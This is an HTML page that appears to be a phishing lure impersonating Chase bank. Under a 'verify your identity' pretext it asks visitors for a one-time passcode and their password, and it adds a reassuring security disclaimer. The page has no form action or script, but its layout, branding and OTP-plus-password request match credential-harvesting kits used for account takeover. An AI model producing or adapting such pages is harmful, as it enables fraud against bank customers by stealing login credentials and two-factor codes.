<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Chase - Verify Your Identity</title>
<style>
  body { margin: 0; font-family: "Segoe UI", Arial, sans-serif; background: #eef1f4; }
  .topbar { background: #0066a1; color: #fff; padding: 18px 40px; font-size: 22px; font-weight: 700; letter-spacing: 1px; }
  .card { max-width: 440px; margin: 60px auto; background: #fff; padding: 36px; border-radius: 8px; box-shadow: 0 4px 18px rgba(0,0,0,.08); }
  h1 { font-size: 24px; color: #1a1a1a; margin: 0 0 6px; }
  p.sub { color: #555; font-size: 14px; margin: 0 0 24px; }
  label { display: block; font-size: 13px; color: #333; margin-bottom: 6px; font-weight: 600; }
  input { width: 100%; box-sizing: border-box; padding: 12px; border: 1px solid #b9c2cb; border-radius: 4px; font-size: 15px; margin-bottom: 18px; }
  .btn { width: 100%; background: #0066a1; color: #fff; border: 0; padding: 13px; font-size: 16px; font-weight: 600; border-radius: 4px; cursor: pointer; }
  .note { margin-top: 18px; font-size: 12px; color: #777; }
</style>
</head>
<body>
  <div class="topbar">CHASE</div>
  <div class="card">
    <h1>Verify your identity</h1>
    <p class="sub">For your security, please confirm the code we sent to your phone ending in **42.</p>
    <label>One-time passcode</label>
    <input type="text" placeholder="Enter 6-digit code" maxlength="6">
    <label>Password</label>
    <input type="password" placeholder="Enter your password">
    <button class="btn">Continue</button>
    <p class="note">Chase will never ask for your full password or Social Security number by email. If you did not request this, do not continue.</p>
  </div>
</body>
</html>
